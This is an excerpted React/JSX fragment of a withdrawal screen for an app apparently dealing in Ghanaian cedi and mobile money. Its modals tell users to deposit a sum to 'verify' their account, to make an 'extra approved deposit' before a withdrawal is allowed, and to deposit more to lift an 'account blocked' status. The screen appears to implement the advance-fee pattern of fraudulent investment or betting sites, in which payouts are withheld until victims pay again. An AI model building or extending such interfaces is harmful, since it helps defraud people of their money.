      ...
      {showDepositReq && (
        ...
        >
          ...
          >
            ...
            >
              <h2 id="deposit-req-title" style={{ margin: 0, fontSize: 18, fontWeight: 800, color: 'var(--text)' }}>
                Deposit requirement
              </h2>
              <button
                type="button"
            ...
            <p style={{ margin: '6px 0 12px', fontSize: 14, color: 'var(--text-soft)', lineHeight: 1.5 }}>
              You need to deposit GHS {REQUIRED_DEPOSIT.toLocaleString('en-US')}.00 to your account to verify your
              account.
            </p>
            <ul style={{ margin: '0 0 16px', paddingLeft: 18, fontSize: 14, color: 'var(--text)' }}>
              <li>
                Required amount: <strong>GHS {REQUIRED_DEPOSIT.toLocaleString('en-US')}.00</strong>
              </li>
            </ul>
            <button
              type="button"
      ...
      {showExtraDeposit && (
        ...
        >
          ...
          >
            ...
            >
              <h2 id="extra-deposit-title" style={{ margin: 0, fontSize: 18, fontWeight: 800, color: 'var(--text)' }}>
            ...
            <p style={{ margin: '0 0 14px', fontSize: 14, color: 'var(--text-soft)', lineHeight: 1.5 }}>
              You need an extra approved deposit before this withdrawal can be submitted.
            </p>
            <ul style={{ margin: '0 0 18px', paddingLeft: 18, fontSize: 14, color: 'var(--text)', lineHeight: 1.7 }}>
              <li>
                Withdrawal amount: <strong>GHS {fmt(amtNum)}</strong>
              </li>
              <li>
                Required extra approved deposit: <strong>GHS {fmt(extraRequired)}</strong>
              </li>
              <li>
                Available approved deposit credit: <strong>GHS {fmt(extraAvailable)}</strong>
              </li>
              <li>
                Still needed: <strong>GHS {fmt(extraStillNeeded)}</strong>
              </li>
            </ul>
            <button
              type="button"
            ...
            <div style={{ display: 'flex', justifyContent: 'center', marginBottom: 14 }}>
              ...
              >
                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                  <rect x="4" y="11" width="16" height="10" rx="2" fill="var(--accent)" />
                  <path
                    ...
                    strokeLinecap="round"
                  />
                  <circle cx="12" cy="16" r="1.6" fill="var(--bg)" />
                </svg>
              </div>
            </div>
            <h2
              id="blocked-title"
              style={{ margin: 0, fontSize: 20, fontWeight: 800, letterSpacing: '-0.01em', color: 'var(--text)' }}
            >
              account blocked
            </h2>
            <p style={{ margin: '10px 4px 22px', fontSize: 14, color: 'var(--text-soft)', lineHeight: 1.55 }}>
              your account is blocked. deposit ghs {BLOCKED_DEPOSIT.toLocaleString('en-US')}.00 and contact support for
              review.
            </p>
            <button
              type="button"
          ...
          {tab === 'momo' && (
            <form onSubmit={handleSubmit}>
              ...
              >
                ...
                >
                  <label htmlFor="wd-amt" style={{ fontSize: 15, fontWeight: 700, color: 'var(--text)' }}>
                    Amount (GHS)
                  </label>
                  <span style={{ fontSize: 13, color: 'var(--text-dim)' }}>
                    min. {MIN_WITHDRAW.toLocaleString('en-US')}.00
                  </span>
                </div>
                <input
                  id="wd-amt"
              ...
              {overBalance && (
                <div
                  style={{
                    background: 'rgba(255,53,84,0.08)',
                    border: '1px solid rgba(255,53,84,0.2)',
              ...
              <button
                ...
                style={{
                  ...
                  border: 'none',
                  background:
                    isAmountValid && !busy ? 'linear-gradient(135deg, var(--accent), #ffcc33)' : 'var(--surface-2)',
                  color: isAmountValid && !busy ? '#000000' : 'var(--text-dim)',
                  fontWeight: 800,
                  fontSize: 16,
                  cursor: isAmountValid && !busy ? 'pointer' : 'not-allowed',
                  marginBottom: 18,
                }}
              >
                      ...
                      <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                        ...
                        <div>
                          ...
                          <div style={{ fontSize: 11, color: 'var(--text-dim)' }}>
                            {t.method ? NETWORKS[t.method]?.label || t.method : accountPhone}
                          </div>
                        </div>
                      </div>
